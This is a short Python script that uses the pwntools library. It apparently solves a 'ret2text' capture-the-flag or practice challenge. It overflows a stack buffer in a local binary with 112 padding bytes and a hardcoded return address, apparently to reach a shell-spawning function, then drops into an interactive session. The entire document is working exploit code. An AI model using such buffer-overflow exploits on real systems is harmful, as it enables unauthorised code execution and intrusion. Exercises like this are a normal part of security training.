from pwn import *
p=process('./ret2text')
sys_addr=0x804863A
payload=b'a'*112+p32(sys_addr)
p.sendline(payload)
p.interactive()